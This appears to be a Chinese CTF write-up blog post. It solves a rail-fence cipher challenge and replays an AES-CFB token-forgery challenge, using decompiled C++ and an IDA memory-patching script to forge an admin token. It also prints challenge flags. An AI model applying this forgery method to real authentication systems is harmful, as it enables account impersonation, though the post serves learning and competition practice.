<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211022172338715.png" alt="image-20211022172338715"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h2 id="Easy-Railfence"><a href="#Easy-Railfence" class="headerlink" title="Easy Railfence"></a>Easy Railfence</h2><p>尝试分析逻辑失败，或者说要花的时间不值得</p>
<p>题目提示Rail，key和offset未知，那么直接手撕</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211023132429655.png" alt="image-20211023132429655"></p>
<blockquote>
<p>flag{YOucanc1imb0verthefenceeveny0udOnotunderstandhowitworks!=}</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">m = <span class="string">b&#x27;flag&#123;YOucanc1imb0verthefenceeveny0udOnotunderstandhowitworks!=&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = hashlib.md5(m).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>a88dd8d7894a7a65dda2d4c6d44357b9</p>
</blockquote>
<p>二血</p>
<h2 id="EasyCrypto（recuring）"><a href="#EasyCrypto（recuring）" class="headerlink" title="EasyCrypto（recuring）"></a>EasyCrypto（recuring）</h2><blockquote>
<p>ip: 152.136.122.197<br>port: 52503<br>protocol: tcp</p>
</blockquote>
<p>nc链接，好隐晦不知道干嘛，不会又和上次WM一样吧</p>
<p>没看到公告的附件，太卡了，拿到附件让逆向队友upx脱下壳</p>
<p>煞笔，出尼玛逆向题</p>
<p>要达到的攻击效果就是，要在login的时候，把<code>adminadmin</code>生成的<code>token</code>给发过去，但是在register阶段，不能加密任何包含<code>admin</code>字段的字符串</p>
<hr>
<p>从头开始，先脱壳，吾爱破解吧上随便找了个工具</p>
<p>加壳的不能远调？</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211027175039980.png" alt="image-20211027175039980"></p>
<p>whatever脱了就行</p>
<p>然后尽力了，逆向做的不多，刚开始学，而且还是用C++写的，虽然比之前的伪代码好懂多（不知道是不是出题人有意为之）， 但是做到最后看不出来是哪一模式的AES</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v55 = __readfsqword(<span class="number">0x28</span>u);                   <span class="comment">// 开canary，跳过不影响理解</span></span><br><span class="line">  key_unknown = <span class="built_in">GenIV</span>();</span><br><span class="line">  iv_known = <span class="built_in">GenIV</span>();</span><br><span class="line">  std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Here is IV: &quot;</span>);</span><br><span class="line">  <span class="comment">// 输出IV，每8位bin（8*16）转2位hex，填充为0，共32位</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, std::hex);</span><br><span class="line">    v4 = std::setfill&lt;<span class="keyword">char</span>&gt;(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">    v5 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v3, v4);</span><br><span class="line">    v6 = std::<span class="built_in">setw</span>(<span class="number">2</span>);</span><br><span class="line">    output_format = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v5, v6);</span><br><span class="line">    v8 = std::bitset&lt;<span class="number">8ul</span>&gt;::<span class="built_in">to_ulong</span>(&amp;iv_known[i]);<span class="comment">// 转为十进制</span></span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(output_format, v8);</span><br><span class="line">  &#125;</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">display</span>();</span><br><span class="line">        std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;choice);</span><br><span class="line">        <span class="keyword">if</span> ( choice != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(name);</span><br><span class="line">        v9 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Plz input your name: &quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v9, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cin, name);</span><br><span class="line">        <span class="comment">// 输入的name不包含&quot;admin&quot;，而且长度为16的倍数</span></span><br><span class="line">        <span class="keyword">if</span> ( std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">find</span>(name, <span class="string">&quot;admin&quot;</span>, <span class="number">0LL</span>) != <span class="number">-1</span></span><br><span class="line">          || (std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">length</span>(name) &amp; <span class="number">15</span>) != <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v11 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">          std::ostream::<span class="keyword">operator</span>&lt;&lt;(v11, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v12 = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">length</span>(name);</span><br><span class="line">        <span class="keyword">if</span> ( v12 &gt; <span class="number">1152921504606846975LL</span> )</span><br><span class="line">          __cxa_throw_bad_array_new_length();</span><br><span class="line">        v13 = <span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="number">8</span> * v12);</span><br><span class="line">        v14 = v12 - <span class="number">1</span>;</span><br><span class="line">        v15 = v13;</span><br><span class="line">        <span class="keyword">while</span> ( v14 &gt;= <span class="number">0</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          std::bitset&lt;8ul&gt;::<span class="built_in">bitset</span>(v15);</span><br><span class="line">          v15 += <span class="number">8LL</span>;</span><br><span class="line">          --v14;</span><br><span class="line">        &#125;</span><br><span class="line">        bin_name = v13;</span><br><span class="line">        <span class="comment">// 将name的每个字符取出来，并转成8位bin</span></span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = j;</span><br><span class="line">          <span class="keyword">if</span> ( v16 &gt;= std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">length</span>(name) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v17 = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">at</span>(name, j);</span><br><span class="line">          std::bitset&lt;8ul&gt;::<span class="built_in">bitset</span>(&amp;v47, *v17);</span><br><span class="line">          *(bin_name + <span class="number">8LL</span> * j) = v47;</span><br><span class="line">        &#125;</span><br><span class="line">        len_name = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">length</span>(name);</span><br><span class="line">        <span class="built_in">encode</span>(key_unknown, iv_known, bin_name, len_name);</span><br><span class="line">        std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Here is your token: &quot;</span>);</span><br><span class="line">        <span class="comment">// 输出token</span></span><br><span class="line">        <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">        &#123;</span><br><span class="line">          v19 = k;</span><br><span class="line">          <span class="keyword">if</span> ( v19 &gt;= std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">length</span>(name) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v20 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, std::hex);</span><br><span class="line">          v21 = std::setfill&lt;<span class="keyword">char</span>&gt;(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">          v22 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v20, v21);</span><br><span class="line">          v23 = std::<span class="built_in">setw</span>(<span class="number">2</span>);</span><br><span class="line">          v24 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(v22, v23);</span><br><span class="line">          v25 = std::bitset&lt;<span class="number">8ul</span>&gt;::<span class="built_in">to_ulong</span>(<span class="number">8LL</span> * k + bin_name);</span><br><span class="line">          std::ostream::<span class="keyword">operator</span>&lt;&lt;(v24, v25);</span><br><span class="line">        &#125;</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;std::cout, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(name);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( choice != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Plz input your token: &quot;</span>);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(input_token);</span><br><span class="line">      std::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cin, input_token);</span><br><span class="line">      <span class="comment">// 长度必须是32的倍数</span></span><br><span class="line">      <span class="keyword">if</span> ( (std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">length</span>(input_token) &amp; <span class="number">31</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v26 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;no no no&quot;</span>);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(v26, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      v27 = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">length</span>(input_token) &gt;&gt; <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v27 &gt; <span class="number">0xFFFFFFFFFFFFFFF</span>LL )</span><br><span class="line">        __cxa_throw_bad_array_new_length();</span><br><span class="line">      init = <span class="keyword">operator</span> <span class="keyword">new</span>[](<span class="number">8</span> * v27);</span><br><span class="line">      v29 = v27 - <span class="number">1</span>;</span><br><span class="line">      v30 = init;</span><br><span class="line">      <span class="comment">// 把token的每两个字符取出，并转成bin</span></span><br><span class="line">      <span class="keyword">while</span> ( v29 &gt;= <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        std::bitset&lt;8ul&gt;::<span class="built_in">bitset</span>(v30);</span><br><span class="line">        v30 += <span class="number">8LL</span>;</span><br><span class="line">        --v29;</span><br><span class="line">      &#125;</span><br><span class="line">      bit_token = init;</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; ; ++m )</span><br><span class="line">      &#123;</span><br><span class="line">        v31 = m;</span><br><span class="line">        <span class="keyword">if</span> ( v31 &gt;= std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">length</span>(input_token) &gt;&gt; <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">substr</span>(</span><br><span class="line">          name,</span><br><span class="line">          input_token,</span><br><span class="line">          <span class="number">2</span> * m,</span><br><span class="line">          <span class="number">2LL</span>);</span><br><span class="line">        v32 = std::__cxx11::<span class="built_in">stoi</span>(name, <span class="number">0LL</span>, <span class="number">16LL</span>);</span><br><span class="line">        std::bitset&lt;8ul&gt;::<span class="built_in">bitset</span>(&amp;v47, v32);</span><br><span class="line">        *(bit_token + <span class="number">8LL</span> * m) = v47;</span><br><span class="line">        std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(name);</span><br><span class="line">      &#125;</span><br><span class="line">      len_token = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">length</span>(input_token);</span><br><span class="line">      <span class="built_in">decode</span>(key_unknown, iv_known, bit_token, (len_token &gt;&gt; <span class="number">1</span>));</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">basic_string</span>(output_name);</span><br><span class="line">      <span class="comment">// 输出解密后的token</span></span><br><span class="line">      <span class="keyword">for</span> ( n = <span class="number">0</span>; ; ++n )</span><br><span class="line">      &#123;</span><br><span class="line">        v34 = n;</span><br><span class="line">        <span class="keyword">if</span> ( v34 &gt;= std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">length</span>(input_token) &gt;&gt; <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v35 = std::bitset&lt;<span class="number">8ul</span>&gt;::<span class="built_in">to_ulong</span>(<span class="number">8LL</span> * n + bit_token);</span><br><span class="line">        std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="keyword">operator</span>+=(output_name, v35);</span><br><span class="line">      &#125;</span><br><span class="line">      v36 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">      v37 = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(v36, output_name);</span><br><span class="line">      std::ostream::<span class="keyword">operator</span>&lt;&lt;(v37, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      <span class="comment">// 从output_name中取前10个作为name</span></span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">substr</span>(name, output_name, <span class="number">0LL</span>, <span class="number">10LL</span>);</span><br><span class="line">      tip = std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::<span class="built_in">compare</span>(name, <span class="string">&quot;adminadmin&quot;</span>) == <span class="number">0</span>;</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(name);</span><br><span class="line">      <span class="keyword">if</span> ( tip )</span><br><span class="line">      &#123;</span><br><span class="line">        get_flag = std::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="keyword">char</span>&gt;(&amp;std::cout, &amp;flag[abi:cxx11]);</span><br><span class="line">        std::ostream::<span class="keyword">operator</span>&lt;&lt;(get_flag, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">      &#125;</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(output_name);</span><br><span class="line">      std::__cxx11::basic_string&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;,std::allocator&lt;<span class="keyword">char</span>&gt;&gt;::~<span class="built_in">basic_string</span>(input_token);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( choice == <span class="number">3</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    v40 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Wrong choice&quot;</span>);</span><br><span class="line">    std::ostream::<span class="keyword">operator</span>&lt;&lt;(v40, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后加密函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">encode</span><span class="params">(__int64 KEY, __int64 known_iv, __int64 plaintext, <span class="keyword">int</span> length)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+20h] [rbp-200h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+24h] [rbp-1FCh]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+28h] [rbp-1F8h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+2Ch] [rbp-1F4h]</span></span><br><span class="line">  __int64 iv[<span class="number">16</span>]; <span class="comment">// [rsp+30h] [rbp-1F0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> key[<span class="number">360</span>]; <span class="comment">// [rsp+B0h] [rbp-170h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v14; <span class="comment">// [rsp+218h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(key, <span class="number">0</span>, <span class="number">352uLL</span>);</span><br><span class="line">  <span class="built_in">KeyExpansion</span>(KEY, key);</span><br><span class="line">  <span class="built_in">memset</span>(iv, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(iv));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    iv[i] = *(known_iv + <span class="number">8LL</span> * i);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; length; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">encrypt</span>(iv, key);</span><br><span class="line">    std::bitset&lt;8ul&gt;::<span class="keyword">operator</span>^=(plaintext + <span class="number">8LL</span> * v9, iv);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">14</span>; ++k )</span><br><span class="line">      iv[k] = iv[k + <span class="number">1</span>];</span><br><span class="line">    v4 = v9++;</span><br><span class="line">    iv[<span class="number">15</span>] = *(<span class="number">8LL</span> * v4 + plaintext);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v14;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密函数</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">decode</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, <span class="keyword">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-20Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [rsp+28h] [rbp-208h]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [rsp+2Ch] [rbp-204h]</span></span><br><span class="line">  <span class="keyword">int</span> k; <span class="comment">// [rsp+30h] [rbp-200h]</span></span><br><span class="line">  <span class="keyword">int</span> v12; <span class="comment">// [rsp+34h] [rbp-1FCh]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+38h] [rbp-1F8h] BYREF</span></span><br><span class="line">  __int64 v14[<span class="number">16</span>]; <span class="comment">// [rsp+40h] [rbp-1F0h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> v15[<span class="number">360</span>]; <span class="comment">// [rsp+C0h] [rbp-170h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v16; <span class="comment">// [rsp+228h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v16 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(v15, <span class="number">0</span>, <span class="number">0x160</span>uLL);</span><br><span class="line">  <span class="built_in">KeyExpansion</span>(a1, v15);</span><br><span class="line">  <span class="built_in">memset</span>(v14, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(v14));</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    v14[i] = *(a2 + <span class="number">8LL</span> * i);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; a4; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">encrypt</span>(v14, v15);</span><br><span class="line">    v12 = std::bitset&lt;<span class="number">8ul</span>&gt;::<span class="built_in">to_ulong</span>(<span class="number">8LL</span> * v9 + a3);</span><br><span class="line">    v4 = v9++;</span><br><span class="line">    std::bitset&lt;8ul&gt;::<span class="keyword">operator</span>^=(a3 + <span class="number">8LL</span> * v4, v14);</span><br><span class="line">    <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">14</span>; ++k )</span><br><span class="line">      v14[k] = v14[k + <span class="number">1</span>];</span><br><span class="line">    std::bitset&lt;8ul&gt;::<span class="built_in">bitset</span>(&amp;v13, v12);</span><br><span class="line">    v14[<span class="number">15</span>] = v13;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v16;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出是AES，感觉是CFB？</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/12232528-c5c4946255a849379be143aaca8d1ecf.png" alt="img"></p>
<p>借一下上次的图</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20180903220102338"></p>
<p>我觉得已知IV，根据重排攻击，搞出<code>E_KEY(IV)</code>，应该不难，然后另起炉灶，用IV和KEY加密以<code>adminadmin</code>开头的明文，再send过去就好了</p>
<p>吧</p>
<p>之前字节CTF就做到类似的，看V神的博客知道怎么攻击，可惜没实现</p>
<p>然后网上搜到翻车鱼师傅的博客</p>
<p><a href="https://blog.shi1011.cn/ctf/1700">https://blog.shi1011.cn/ctf/1700</a></p>
<p>寄</p>
<p>虽然比赛的想到绕过<code>if</code>，让逆向队友帮<code>nop</code>了一下，但是机智的我想改了本地有毛用，服务器没变啊</p>
<p>。。。忘了可以在动调的时候直接改内存，把本地的IV改成服务器跑的IV，然后加密<code>adminadmin</code>填充成16长度的字符</p>
<p>emmmmmm逆向的基本素质不够，归结于这方面做的不多</p>
<p>看着师傅的博客一边复现一边学</p>
<hr>
<p>绕过加密的<code>if</code>，将<code>admin</code>字符串改成别的</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211029135700673.png" alt="image-20211029135700673"></p>
<p>再在<code>GenIV</code>的时候下个断点，远程调试，步入<code>GenIV</code></p>
<p>这里还有一点二进制方向的点，就是IV和KEY其实是同一个，动调也可以看出在加密的时候两个寄存器的值其实是一样的</p>
<p>原因主要是和这个有关系吧</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211029135938979.png" alt="image-20211029135938979"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211029135947278.png" alt="image-20211029135947278"></p>
<p>返回的这个是一个全局变量；所以我们一定要步入，在<code>return</code>之前把<code>0x561885e08300</code>处的值给改成服务器的IV</p>
<p>可以像师傅那样写个脚本放进ida，也可以。。。emmmmm按理说也可以手动patch掉啊，没成功，以后再说</p>
<p>偷下脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">addr = <span class="number">0x55DF1EE08300</span>  <span class="comment"># patch address</span></span><br><span class="line">test = <span class="string">&quot;2beb18d821cc340659a730a1ac571bb3&quot;</span>  <span class="comment"># patch hex data</span></span><br><span class="line">ps = [i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">b&#x27;&#x27;</span>.fromhex(test)]</span><br><span class="line"><span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(ps):</span><br><span class="line">    ida_bytes.patch_qword(addr+i * <span class="number">8</span>, v)</span><br></pre></td></tr></table></figure>

<p>反正就是把这些数据给换成连上服务器的IV</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211029143511328.png" alt="image-20211029143511328"></p>
<p>IV和KEY都要改</p>
<p>可以看到</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211029143704073.png" alt="image-20211029143704073"></p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211029143734257.png" alt="image-20211029143734257"></p>
<p>两个IV是一样的了，现在是要加密<code>adminadmin</code>后面随便填充满16个字符</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211029143854710.png" alt="image-20211029143854710"></p>
<p>把加密的结果给服务器，就获得flag啦</p>
<p><img data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20211029143943526.png" alt="image-20211029143943526"></p>
